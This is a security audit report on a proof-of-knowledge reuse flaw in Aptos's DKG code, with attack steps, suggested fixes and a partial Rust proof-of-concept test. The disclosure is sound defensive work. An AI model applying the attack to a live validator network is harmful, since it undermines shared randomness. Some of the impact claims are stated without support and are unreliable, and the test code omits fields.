# Audit Report

## Title
DKG Proof-of-Knowledge Reuse Vulnerability: Validators Can Participate Without Contributing Entropy

## Summary
The `batch_verify_soks()` function in the DKG (Distributed Key Generation) implementation fails to bind Schnorr Proofs-of-Knowledge (PoKs) to individual validators. This allows a malicious validator to copy another validator's commitment and PoK, sign it with their own BLS key, and pass all verification checks without knowing the discrete logarithm of their claimed contribution. This breaks the fundamental soundness guarantee that each DKG participant proves knowledge of their contribution. [1](#0-0) 

## Finding Description

The DKG protocol is designed to allow validators to collectively generate a shared random value, where each validator contributes independent entropy. A critical security property is that each validator must prove knowledge of the discrete logarithm of their commitment through a Schnorr Proof-of-Knowledge (PoK).

However, the current implementation has a soundness violation:

**The Vulnerability:** The Schnorr PoK verification only checks that the PoK is mathematically valid for a given commitment, but does NOT bind the PoK to the validator's identity. The challenge computation includes only `(R, pk, g)` without any validator-specific context: [2](#0-1) 

**Attack Execution Path:**

1. Honest Validator A creates a DKG transcript with commitment `c_A = g^a` and valid PoK `pok_A = (R_A, s_A)`
2. Malicious Validator B observes A's transcript over the gossip network
3. Validator B creates their own transcript with:
   - Same commitment: `c_B = c_A` (copied)
   - Same PoK: `pok_B = pok_A` (reused)
   - Different signature: `sig_B` over `Contribution{comm: c_A, player: B, aux: (epoch, addr_B)}`
4. When B's transcript is verified individually, `batch_verify_soks()` accepts it because:
   - Sum check passes: single commitment equals the dealt public key
   - PoK verification passes: `pok_A` is mathematically valid for `c_A`
   - Signature verification passes: B signed their own contribution [3](#0-2) 

5. When transcripts are aggregated, both are blindly combined: [4](#0-3) 

6. The final aggregated transcript has `V[n] = c_A + c_A = 2·c_A` with `soks = [(A, c_A, sig_A, pok_A), (B, c_A, sig_B, pok_A)]`
7. Final verification passes because the sum of commitments equals the aggregated public key, and the same PoK works for both copies of `c_A`

**Root Cause:** The Schnorr challenge is computed as `Hash(R, pk, g)` without including the validator's Player ID or any session-binding context. This allows the same PoK to be valid for the same commitment regardless of which validator claims it. [5](#0-4) 

## Impact Explanation

This vulnerability qualifies as **High Severity** ("Significant protocol violations") because:

1. **Entropy Reduction**: If multiple colluding validators reuse the same honest validator's commitment, the DKG output has drastically reduced entropy. Example: 100 validators participate, but 50 colluding validators all copy Validator 1's commitment → effective entropy from only 51 independent sources instead of 100.

2. **Threshold Security Breakdown**: The DKG threshold assumes each participant contributes independent randomness. When multiple participants submit identical commitments, the threshold guarantee degrades. If enough validators collude to reuse commitments, they could potentially manipulate or predict the shared randomness.

3. **Randomness Beacon Manipulation**: Aptos uses the DKG output for the randomness beacon, which affects leader election and other consensus-critical operations. Reduced entropy or predictability in the beacon could allow attackers to bias leader selection or game randomness-dependent operations.

4. **Protocol Soundness Violation**: The fundamental assumption that "each validator proves knowledge of their contribution's discrete log" is violated, breaking the DKG security model documented in cryptographic literature.

While this doesn't directly cause immediate fund loss or network partition, it compromises the integrity of a critical consensus component (randomness generation), warranting High severity classification.

## Likelihood Explanation

**Likelihood: High**

The attack is highly feasible:

1. **Low Barrier to Entry**: Any validator participating in DKG can execute this attack by simply observing network traffic
2. **No Special Privileges Required**: No insider access or validator collusion needed for basic exploitation
3. **Gossip Network Observability**: DKG transcripts are broadcast over the P2P gossip network, making other validators' commitments and PoKs readily observable
4. **Silent Exploitation**: The attack leaves no obvious traces since all verification checks pass normally
5. **Amplification Through Collusion**: Multiple colluding validators can amplify the impact by all copying the same commitment

The only practical limitation is that validators must wait to observe another validator's transcript before copying it, but this is trivial in the normal DKG protocol flow.

## Recommendation

**Primary Fix: Bind PoK to Validator Identity**

Modify the Schnorr PoK challenge computation to include validator-specific binding:

```rust
// In schnorr.rs, update Challenge struct:
#[derive(Serialize, Deserialize, BCSCryptoHash, CryptoHasher)]
#[allow(non_snake_case)]
struct Challenge<Gr> {
    R: Gr,       // g^r
    pk: Gr,      // g^a
    g: Gr,
    player: Player,  // ADD: Bind to player ID
    aux: Vec<u8>,    // ADD: Bind to session context
}

// Update pok_prove to include context:
pub fn pok_prove<Gr, R, A>(
    a: &Scalar, 
    g: &Gr, 
    pk: &Gr, 
    player: &Player,
    aux: &A,
    rng: &mut R
) -> PoK<Gr>
where
    Gr: Serialize + Group + for<'a> Mul<&'a Scalar, Output = Gr>,
    A: Serialize,
    R: rand_core::RngCore + rand_core::CryptoRng,
{
    let r = random_scalar(rng);
    let R = g.mul(&r);
    let e = schnorr_hash(Challenge::<Gr> { 
        R, 
        pk: *pk, 
        g: *g, 
        player: *player,
        aux: bcs::to_bytes(aux).unwrap(),
    });
    let s = r + e * a;
    (R, s)
}
```

**Alternative: Check for Duplicate Commitments**

Add explicit uniqueness checking in `batch_verify_soks()`:

```rust
// After line 68 in contribution.rs:
let mut commitment_set = HashSet::new();
for (_, c_i, _, _) in soks {
    if !commitment_set.insert(c_i) {
        bail!("Duplicate commitment detected: {}", c_i);
    }
}
```

This prevents multiple players from using identical commitments, though the root cause fix (binding PoK to player) is more cryptographically sound.

## Proof of Concept

```rust
#[cfg(test)]
mod soundness_violation_test {
    use super::*;
    use aptos_crypto::bls12381::PrivateKey;
    use rand::thread_rng;
    
    #[test]
    fn test_pok_reuse_attack() {
        let mut rng = thread_rng();
        
        // Honest Validator A creates legitimate contribution
        let sk_a = PrivateKey::generate(&mut rng);
        let pk_a = sk_a.public_key();
        let player_a = Player { id: 0 };
        let aux_a = (1u64, AccountAddress::random());
        
        // Generate A's transcript with valid PoK
        let secret_a = InputSecret::generate(&mut rng);
        let transcript_a = WTrx::deal(
            &config, &pp, &sk_a, &pk_a, &eks, &secret_a, 
            &aux_a, &player_a, &mut rng
        );
        
        // Extract A's commitment and PoK
        let (player_a_id, comm_a, sig_a, pok_a) = &transcript_a.soks[0];
        
        // Malicious Validator B creates transcript reusing A's commitment and PoK
        let sk_b = PrivateKey::generate(&mut rng);
        let player_b = Player { id: 1 };
        let aux_b = (1u64, AccountAddress::random());
        
        // B signs their own contribution but reuses A's commitment and PoK
        let sig_b = sk_b.sign(&Contribution {
            comm: *comm_a,  // Reused from A
            player: player_b,
            aux: aux_b.clone(),
        }).unwrap();
        
        // Create B's malicious transcript
        let transcript_b = Transcript {
            soks: vec![(player_b, *comm_a, sig_b, *pok_a)],  // Reused PoK!
            // ... other fields omitted for brevity
        };
        
        // Verify B's transcript individually - should pass despite B not knowing discrete log
        let spks_b = vec![sk_b.public_key()];
        let result = transcript_b.verify(&config, &pp, &spks_b, &eks, &[aux_b]);
        
        // THIS SHOULD FAIL BUT CURRENTLY PASSES - demonstrating the vulnerability
        assert!(result.is_ok(), "Vulnerability: PoK reuse attack succeeded!");
        
        // Aggregate both transcripts
        let mut aggregated = transcript_a.clone();
        aggregated.aggregate_with(&config, &transcript_b).unwrap();
        
        // Verify aggregated transcript - also passes despite B's invalid contribution
        let spks = vec![pk_a, sk_b.public_key()];
        let aux = vec![aux_a, aux_b];
        let result = aggregated.verify(&config, &pp, &spks, &eks, &aux);
        
        assert!(result.is_ok(), "Vulnerability: Aggregated transcript with reused PoK passes verification!");
    }
}
```

## Notes

This vulnerability specifically affects the DAS (Distributed Aggregatable Signature) PVSS protocols used in production DKG: [6](#0-5) 

The "chunky" PVSS variants do use context binding but are not deployed in production. The production code paths through `verify_transcript` call `batch_verify_soks()` without player-binding: [7](#0-6) 

While validators are prevented from submitting multiple transcripts through duplicate-dealer checks, different validators can submit identical commitments with reused PoKs, which is the core vulnerability exploited here.

### Citations

**File:** crates/aptos-dkg/src/pvss/contribution.rs (L28-104)
```rust
pub fn batch_verify_soks<Gr, A>(
    soks: &[SoK<Gr>],
    pk_base: &Gr,
    pk: &Gr,
    spks: &[bls12381::PublicKey],
    aux: &[A],
    tau: &Scalar,
) -> anyhow::Result<()>
where
    Gr: Serialize + HasMultiExp + Display + Copy + Group + for<'a> Mul<&'a Scalar>,
    A: Serialize + Clone,
{
    if soks.len() != spks.len() {
        bail!(
            "Expected {} signing PKs, but got {}",
            soks.len(),
            spks.len()
        );
    }

    if soks.len() != aux.len() {
        bail!(
            "Expected {} auxiliary infos, but got {}",
            soks.len(),
            aux.len()
        );
    }

    // First, the PoKs
    let mut c = Gr::identity();
    for (_, c_i, _, _) in soks {
        c.add_assign(c_i)
    }

    if c.ne(pk) {
        bail!(
            "The PoK does not correspond to the dealt secret. Expected {} but got {}",
            pk,
            c
        );
    }

    let poks = soks
        .iter()
        .map(|(_, c, _, pok)| (*c, *pok))
        .collect::<Vec<(Gr, schnorr::PoK<Gr>)>>();

    // TODO(Performance): 128-bit exponents instead of powers of tau
    schnorr::pok_batch_verify::<Gr>(&poks, pk_base, &tau)?;

    // Second, the signatures
    let msgs = soks
        .iter()
        .zip(aux)
        .map(|((player, comm, _, _), aux)| Contribution::<Gr, A> {
            comm: *comm,
            player: *player,
            aux: aux.clone(),
        })
        .collect::<Vec<Contribution<Gr, A>>>();
    let msgs_refs = msgs
        .iter()
        .map(|c| c)
        .collect::<Vec<&Contribution<Gr, A>>>();
    let pks = spks
        .iter()
        .map(|pk| pk)
        .collect::<Vec<&bls12381::PublicKey>>();
    let sig = bls12381::Signature::aggregate(
        soks.iter()
            .map(|(_, _, sig, _)| sig.clone())
            .collect::<Vec<bls12381::Signature>>(),
    )?;

    sig.verify_aggregate(&msgs_refs[..], &pks[..])?;
    Ok(())
}
```

**File:** crates/aptos-dkg/src/pvss/schnorr.rs (L25-29)
```rust
struct Challenge<Gr> {
    R: Gr,  // g^r
    pk: Gr, // g^a
    g: Gr,
}
```

**File:** crates/aptos-dkg/src/pvss/schnorr.rs (L50-58)
```rust
fn schnorr_hash<Gr>(c: Challenge<Gr>) -> Scalar
where
    Gr: Serialize,
{
    let c = signing_message(&c)
        .expect("unexpected error during Schnorr challenge struct serialization");

    hash_to_scalar(&c, SCHNORR_POK_DST)
}
```

**File:** crates/aptos-dkg/src/pvss/das/unweighted_protocol.rs (L336-338)
```rust
        for sok in &other.soks {
            self.soks.push(sok.clone());
        }
```

**File:** types/src/dkg/real_dkg/mod.rs (L38-41)
```rust
pub type WTrx = pvss::das::WeightedTranscript;
pub type DkgPP = <WTrx as Transcript>::PublicParameters;
pub type SSConfig = <WTrx as Transcript>::SecretSharingConfig;
pub type EncPK = <WTrx as Transcript>::EncryptPubKey;
```

**File:** types/src/dkg/real_dkg/mod.rs (L368-374)
```rust
        trx.main.verify(
            &params.pvss_config.wconfig,
            &params.pvss_config.pp,
            &spks,
            &all_eks,
            &aux,
        )?;
```
